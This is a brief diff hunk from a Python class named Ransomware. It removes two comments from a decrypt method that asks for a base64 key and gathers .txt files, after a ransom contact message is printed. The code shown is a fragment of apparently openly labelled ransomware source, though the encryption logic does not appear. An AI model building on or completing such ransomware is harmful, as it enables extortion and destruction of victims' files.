@@ -53,8 +53,7 @@ class Ransomware:
         print(MESSAGE_CONTACT)# print message
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        # main function for decrypting 
+      
         #ask the user the base64 key
         key=base64.b64decode(input("Enter key: "))#decode the key
         FILES=self.get_files("*.txt")#get all txt files
